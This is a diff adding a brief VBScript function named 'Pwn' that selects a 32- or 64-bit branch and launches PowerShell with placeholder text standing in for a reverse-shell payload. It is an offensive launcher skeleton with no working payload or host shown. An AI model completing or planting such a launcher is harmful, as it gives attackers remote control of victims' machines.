@@ -1,0 +1,9 @@
+Function Pwn()
+	Set shell = CreateObject("wscript.Shell")
+	If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
+		shell.run "powershell.exe rev shell for 64 bit"
+	Else
+		shell.run "powershell.exe rev shell for 32 bit"
+	End If
+End Function
+
